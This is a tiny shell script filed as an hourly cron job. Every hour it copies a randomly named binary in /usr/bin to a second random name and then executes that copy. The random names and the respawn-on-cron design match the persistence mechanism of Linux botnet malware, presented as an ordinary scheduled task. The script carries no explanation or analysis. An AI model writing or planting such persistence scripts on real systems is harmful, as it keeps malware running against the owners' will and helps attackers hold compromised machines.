# cron.hourly/zwkimthpcolzou.sh
#!/bin/sh
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/X11R6/bin
cp "/usr/bin/zwkimthpcolzou" "/usr/bin/dpouulikps"
"/usr/bin/dpouulikps"